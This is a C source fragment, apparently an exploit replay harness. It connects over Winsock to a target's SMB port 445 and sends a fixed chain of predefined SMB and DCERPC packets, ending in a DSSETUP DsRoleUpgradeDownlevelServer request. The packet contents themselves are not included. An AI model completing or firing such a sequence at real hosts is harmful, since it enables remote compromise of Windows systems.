int send_packet_and_read_response(const BYTE* packet, size_t packet_size, SOCKET sock)
{
	int result;
	char buff[2048];

	result = send(sock, (const char*)packet, packet_size, 0);
	if (result == 0)
	{
		printf("Send failed: %d\n", WSAGetLastError());
		return -1;
	}

	memset(buff, 0, sizeof(buff));
	result = recv(sock, buff, sizeof(buff) - 1, 0);
	if (result > 0)
	{
		printf("Server replied with packet\n");
	}
	else if (result == 0)
	{
		printf("Connection closed by server.\n");
		return -1;
	}
	else
	{
		printf("recv failed: %d\n", WSAGetLastError());
		return -1;
	}

	return 0;
}

void play_sequence(const char* target_ip)
{
	WSADATA wsaData;
	SOCKET sock = INVALID_SOCKET;
	struct sockaddr_in server_addr;
	int target_port = 445;
	int result;

	printf("Initializing Winsock...\n");
	result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) 
	{
		printf("WSAStartup failed: %d\n", result);
		return;
	}

	// Create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		printf("Socket creation failed: %d\n", WSAGetLastError());
		WSACleanup();
		return;
	}

	// Configure server address
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(target_port);
	server_addr.sin_addr.s_addr = inet_addr(target_ip);

	// Connect to server
	printf("Connecting to %s:%d...\n", target_ip, target_port);
	if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
	{
		printf("Connection failed: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return;
	}

	printf("Connected to %s:%d successfully!\n", target_ip, target_port);


	send_packet_and_read_response(SMB_NEGOTIATE_REQUEST_PACKET, sizeof(SMB_NEGOTIATE_REQUEST_PACKET), sock);
	send_packet_and_read_response(SMB_SETUP_ANDX_REQUEST_1_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_1_PACKET), sock);
	send_packet_and_read_response(SMB_SETUP_ANDX_REQUEST_2_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_2_PACKET), sock);
	send_packet_and_read_response(SMB_CONNECT_ANDX_REQUEST_PACKET, sizeof(SMB_CONNECT_ANDX_REQUEST_PACKET), sock);
	send_packet_and_read_response(DCERPC_BIND_REQUEST_PACKET, sizeof(DCERPC_BIND_REQUEST_PACKET), sock);
	send_packet_and_read_response(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET), sock);


	closesocket(sock);
	WSACleanup();
	printf("Connection closed.\n");
}